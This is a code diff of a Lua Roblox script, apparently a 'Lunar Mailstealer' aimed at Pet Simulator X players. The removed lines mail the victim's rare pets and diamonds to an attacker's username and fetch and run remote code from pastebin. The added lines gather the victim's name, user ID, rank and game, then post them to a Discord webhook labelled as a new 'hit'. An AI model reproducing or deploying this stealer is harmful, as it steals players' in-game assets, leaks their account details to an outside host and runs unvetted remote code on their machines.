@@ -20,7 +20,7 @@ function sendWebhook(webhook, message)
     "Kid with shit exploit"
 
  local url =
-    _G.Webhook
+    webhook
  local data = {
     ["content"] = message
  }
@@ -47,43 +47,51 @@ if dims < 0 then
 end
 
 wait(30)
-while wait() do
-for i,v in pairs(savedPets) do
-    local v2 = FrameworkLibrary.Directory.Pets[v.id]
-	if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 or v2.rarity == "Event" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 or v2.rarity == "Exclusive" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 then
-            --loadstring(game:HttpGet("https://pastebin.com/raw/LjRnXwGB"))()
-		_G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 4900000
-		local args = {
-    	[1] = {
-        ["Recipient"] = _G.Username,
-        ["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
-        ["Pets"] = {v.uid},
-        ["Message"] = "gg/lunarhub | Username: ".._G.Username..""
-    	}
-		}
-		print("l")
-		Invoke("Send Mail", unpack(args))
-		_G.PetName = v2.name
-		_G.PetRar = v2.rarity
-		loadstring(game:HttpGet("https://pastebin.com/raw/Crk3YAnP"))()
-		loadstring(game:HttpGet("obfuscated pastebin here"))()
-	elseif v2.huge == true or v2.rarity == "Event" or v2.rarity == "Exclusive" then
-            --loadstring(game:HttpGet("https://pastebin.com/raw/LjRnXwGB"))()
-		_G.Diamonds = 0
-		local args = {
-    	[1] = {
-        ["Recipient"] = _G.Username,
-        ["Diamonds"] = 0,
-        ["Pets"] = {v.uid},
-        ["Message"] = "gg/lunarhub | Username: ".._G.Username..""
-    	}
-		}
-		Invoke("Send Mail", unpack(args))
-		_G.PetName = v2.name
-		_G.PetRar = v2.rarity
-        loadstring(game:HttpGet("https://pastebin.com/raw/Crk3YAnP"))()
-        wait(1.5)
-        loadstring(game:HttpGet("obfuscated pastebin here"))()
-	end
+if game.PlaceId == 6284583030 then
+	_G.GameIn = "Pet Simulator X"
+elseif game.PlaceId == 7722306047 then
+	_G.GameIn = "PSX Trading Plaza"
+elseif game.PlaceId == 10321372166 then
+	_G.GameIn = "PSX Hardcore"
+elseif game.PlaceId == 12610002282 then
+	_G.GameIn = "PSX Pro Trading Plaza"
+elseif game.PlaceId == 11725212117 then
+	_G.GameIn = "PSX Voice Trading Plaza"
+else
+	_G.GameIn = "❓ Couldn't find game"
 end
+local webhookcolor = "13369599"
+_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+_G.PlrUserVictim = game.Players.LocalPlayer.Name
+_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
+_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
+local function sendwebhook(msg)
+local msg = {
+  ["content"]= "**Lunar Mailstealer has detected a new hit!**",
+  ["embeds"]= {
+    {
+      ["title"]= "`Lunar Mailstealer Results`",
+      ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
+      ["url"]= "https://discord.gg/pd65DxGhVc",
+      ["color"]= ""..webhookcolor.."",
+      ["fields"]= {
+        {
+          ["name"]= "Diamonds 💎",
+          ["value"]= "```".._G.Diamonds.."```",
+          ["inline"]= true
+        },
+        {
+          ["name"]= "Pet Name & Rarity",
+          ["value"]= "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."```",
+		  ["inline"]= true
+        }
+      }
+    }
+  },
+  ["attachments"] = {}
+}
+local Webhook = _G.Webhook
+request = http_request or request or HttpPost or syn.request
+request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
 end
+sendwebhook(msg)
